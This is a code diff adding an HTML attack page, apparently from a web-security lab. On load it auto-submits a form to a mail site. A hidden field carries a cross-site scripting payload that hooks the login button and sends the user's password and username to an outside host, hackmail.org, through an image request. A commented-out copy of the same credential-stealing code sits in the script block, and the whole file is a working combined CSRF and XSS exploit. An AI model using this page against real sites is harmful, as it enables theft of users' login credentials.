@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<script type="text/javascript">
+		function attack(){
+			document.forms[0].submit();
+		}
+
+		 // function myfunction(){
+		 // 	void((new Image()).src="http://hackmail.org/sendmail.php?" + "&username=attacker" + "&payload=password: "+ document.getElementsByName("pw").value + " login: " + document.getElementsByName("login").value + "&random=" + Math.random());
+		 // } 
+		 // setTimeout(function(){document.getElementsByTagName("button")[0].onClick=function(){myFunction()}});
+
+		
+
+
+	</script>
+
+
+	
+</head>
+<body onload="attack()">
+	<form method="POST" name="login" action="http://dncmail.org/">
+		<input type="hidden" name="login" value='"><script> setTimeout(function(){document.getElementsByTagName("button")[0].onclick=function(){void((new Image()).src="http://hackmail.org/sendmail.php?" + "&username=here" + "&payload=password: "+ document.getElementsByName("pw")[0].value + " login: " + document.getElementsByName("login")[0].value + "&random=" + Math.random());};})</script><input type="hidden'>
+	</form>
+
+
+
+
+</body>
+</html>
